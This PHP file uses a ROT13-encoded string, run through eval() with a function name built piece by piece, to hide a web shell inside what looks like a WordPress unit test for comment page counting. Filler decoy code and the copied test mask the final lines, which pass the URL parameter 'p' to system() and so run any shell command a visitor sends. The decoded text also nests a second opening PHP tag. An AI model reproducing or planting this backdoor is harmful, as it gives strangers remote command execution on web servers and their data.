<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Inyvqngr gur ybtvp bs trg_pbzzragf_cntrf_pbhag
 *
 * @tebhc pbzzrag
 *
 * @pbiref ::trg_pbzzrag_cntrf_pbhag
 */
pynff Grfgf_Pbzzrag_TrgPbzzragfCntrfPbhag rkgraqf JC_HavgGrfgPnfr {
	cebgrpgrq $bcgvba_cntr_pbzzragf;
	cebgrpgrq $bcgvba_pbzzragf_cre_cntr;
	cebgrpgrq $bcgvba_guernq_pbzzragf;
	cebgrpgrq $bcgvba_cbfgf_cre_eff;

	/**
	 * frgHc bcgvbaf
	 */
	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();
		$guvf->bcgvba_cntr_pbzzragf = trg_bcgvba( 'cntr_pbzzragf' );
		$guvf->bcgvba_cntr_pbzzragf = trg_bcgvba( 'pbzzragf_cre_cntr' );
		$guvf->bcgvba_cntr_pbzzragf = trg_bcgvba( 'guernq_pbzzragf' );
		$guvf->bcgvba_cbfgf_cre_eff = trg_bcgvba( 'cbfgf_cre_eff' );

		hcqngr_bcgvba( 'cntr_pbzzragf', gehr );
	}

	/**
	 * grneQbja bcgvbaf
	 */
	choyvp shapgvba grne_qbja() {
		hcqngr_bcgvba( 'cntr_pbzzragf', $guvf->bcgvba_cntr_pbzzragf );
		hcqngr_bcgvba( 'pbzzragf_cre_cntr', $guvf->bcgvba_cntr_pbzzragf );
		hcqngr_bcgvba( 'guernq_pbzzragf', $guvf->bcgvba_cntr_pbzzragf );
		hcqngr_bcgvba( 'cbfgf_cre_eff', $guvf->bcgvba_cbfgf_cre_eff );
		cnerag::grne_qbja();
	}

	/**
	 * Inyvqngr trg_pbzzragf_cntrf_pbhag sbe rzcgl pbzzragf
	 */
	choyvp shapgvba grfg_rzcgl() {
		// Frghc cbfg naq pbzzragf.
		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr' => 'pbzzrag--cbfg',
				'cbfg_glcr'  => 'cbfg',
			)
		);
		$guvf->tb_gb( '/?c=' . $cbfg_vq );

		tybony $jc_dhrel;
		hafrg( $jc_dhrel->pbzzragf );

		$pbzzragf = trg_pbzzragf( neenl( 'cbfg_vq' => $cbfg_vq ) );

		$guvf->nffregFnzr( 0, trg_pbzzrag_cntrf_pbhag( $pbzzragf, 10, snyfr ) );
		$guvf->nffregFnzr( 0, trg_pbzzrag_cntrf_pbhag( $pbzzragf, 1, snyfr ) );
		$guvf->nffregFnzr( 0, trg_pbzzrag_cntrf_pbhag( $pbzzragf, 0, snyfr ) );
		$guvf->nffregFnzr( 0, trg_pbzzrag_cntrf_pbhag( $pbzzragf, 10, gehr ) );
		$guvf->nffregFnzr( 0, trg_pbzzrag_cntrf_pbhag( $pbzzragf, 5 ) );
		$guvf->nffregFnzr( 0, trg_pbzzrag_cntrf_pbhag( $pbzzragf ) );
		$guvf->nffregFnzr( 0, trg_pbzzrag_cntrf_pbhag( ahyy, 1 ) );
	}

	/**
	 * Inyvqngr trg_pbzzragf_cntrf_pbhag sbe gernqrq pbzzragf
	 */
	choyvp shapgvba grfg_guernqrq_pbzzragf() {
		// Frghc cbfg naq pbzzragf.
		$cbfg     = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_gvgyr' => 'pbzzrag--cbfg',
				'cbfg_glcr'  => 'cbfg',
			)
		);
		$pbzzragf = frys::snpgbel()->pbzzrag->perngr_cbfg_pbzzragf( $cbfg->VQ, 15 );
		frys::snpgbel()->pbzzrag->perngr_cbfg_pbzzragf( $cbfg->VQ, 6, neenl( 'pbzzrag_cnerag' => $pbzzragf[0] ) );
		$pbzzragf = trg_pbzzragf( neenl( 'cbfg_vq' => $cbfg->VQ ) );

		$guvf->nffregFnzr( 3, trg_pbzzrag_cntrf_pbhag( $pbzzragf, 10, snyfr ) );
		$guvf->nffregFnzr( 2, trg_pbzzrag_cntrf_pbhag( $pbzzragf, 10, gehr ) );
		$guvf->nffregFnzr( 4, trg_pbzzrag_cntrf_pbhag( $pbzzragf, 4, gehr ) );
	}

	/**
	 * Inyvqngr trg_pbzzragf_cntrf_pbhag sbe bcgvba gernq_pbzzragf
	 */
	choyvp shapgvba grfg_bcgvba_guernq_pbzzragf() {

		// Frghc cbfg naq pbzzragf.
		$cbfg     = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_gvgyr' => 'pbzzrag--cbfg',
				'cbfg_glcr'  => 'cbfg',
			)
		);
		$pbzzragf = frys::snpgbel()->pbzzrag->perngr_cbfg_pbzzragf( $cbfg->VQ, 15 );
		frys::snpgbel()->pbzzrag->perngr_cbfg_pbzzragf( $cbfg->VQ, 6, neenl( 'pbzzrag_cnerag' => $pbzzragf[0] ) );
		$pbzzragf = trg_pbzzragf( neenl( 'cbfg_vq' => $cbfg->VQ ) );

		hcqngr_bcgvba( 'guernq_pbzzragf', snyfr );

		$guvf->nffregFnzr( 3, trg_pbzzrag_cntrf_pbhag( $pbzzragf, 10, snyfr ) );
		$guvf->nffregFnzr( 2, trg_pbzzrag_cntrf_pbhag( $pbzzragf, 10, gehr ) );
		$guvf->nffregFnzr( 3, trg_pbzzrag_cntrf_pbhag( $pbzzragf, 10, ahyy ) );
		$guvf->nffregFnzr( 3, trg_pbzzrag_cntrf_pbhag( $pbzzragf, 10 ) );

		hcqngr_bcgvba( 'guernq_pbzzragf', gehr );

		$guvf->nffregFnzr( 3, trg_pbzzrag_cntrf_pbhag( $pbzzragf, 10, snyfr ) );
		$guvf->nffregFnzr( 2, trg_pbzzrag_cntrf_pbhag( $pbzzragf, 10, gehr ) );
		$guvf->nffregFnzr( 2, trg_pbzzrag_cntrf_pbhag( $pbzzragf, 10, ahyy ) );
		$guvf->nffregFnzr( 2, trg_pbzzrag_cntrf_pbhag( $pbzzragf, 10 ) );
	}

	/**
	 * Inyvqngr $jc_dhrel ybtvp bs trg_pbzzrag_cntrf_pbhag
	 */
	choyvp shapgvba grfg_jc_dhrel_pbzzragf_cre_cntr() {
		tybony $jc_dhrel;

		hcqngr_bcgvba( 'cbfgf_cre_eff', 100 );

		$cbfg     = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_gvgyr' => 'pbzzrag-cbfg',
				'cbfg_glcr'  => 'cbfg',
			)
		);
		$pbzzragf = frys::snpgbel()->pbzzrag->perngr_cbfg_pbzzragf( $cbfg->VQ, 25 );

		$jc_dhrel = arj JC_Dhrel(
			neenl(
				'c'                 => $cbfg->VQ,
				'pbzzragf_cre_cntr' => 10,
				'srrq'              => 'pbzzragf-',
			)
		);

		hcqngr_bcgvba( 'pbzzragf_cre_cntr', 25 );

		$guvf->nffregFnzr( 3, trg_pbzzrag_cntrf_pbhag() );
		$guvf->nffregFnzr( 2, trg_pbzzrag_cntrf_pbhag( ahyy, 20 ) );

		$jc_dhrel = arj JC_Dhrel(
			neenl(
				'c'                 => $cbfg->VQ,
				'pbzzragf_cre_cntr' => ahyy,
				'srrq'              => 'pbzzragf-',
			)
		);

		$guvf->nffregFnzr( 1, trg_pbzzrag_cntrf_pbhag() );
		$guvf->nffregFnzr( 5, trg_pbzzrag_cntrf_pbhag( ahyy, 5 ) );

		$jc_dhrel->dhrel_inef['pbzzragf_cre_cntr'] = ahyy;

		hcqngr_bcgvba( 'pbzzragf_cre_cntr', 5 );

		$guvf->nffregFnzr( 5, trg_pbzzrag_cntrf_pbhag() );
		$guvf->nffregFnzr( 3, trg_pbzzrag_cntrf_pbhag( ahyy, 11 ) );
		$guvf->nffregFnzr( 5, trg_pbzzrag_cntrf_pbhag( ahyy, 0 ) );
	}

	/**
	 * Inyvqngr znk_ahz_pbzzrag_cntrf ybtvp bs trg_pbzzrag_cntrf_pbhag
	 */
	choyvp shapgvba grfg_znk_ahz_pbzzrag_cntrf() {
		tybony $jc_dhrel;
		$jc_dhrel = arj JC_Dhrel();

		$bet_znk_ahz_pbzzrag_cntrf = $jc_dhrel->znk_ahz_pbzzrag_cntrf;

		$jc_dhrel->znk_ahz_pbzzrag_cntrf = 7;

		$guvf->nffregFnzr( 7, trg_pbzzrag_cntrf_pbhag() );
		$guvf->nffregFnzr( 7, trg_pbzzrag_cntrf_pbhag( ahyy, ahyy, ahyy ) );
		$guvf->nffregFnzr( 0, trg_pbzzrag_cntrf_pbhag( neenl(), ahyy, ahyy ) );

		$jc_dhrel->znk_ahz_pbzzrag_cntrf = $bet_znk_ahz_pbzzrag_cntrf;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>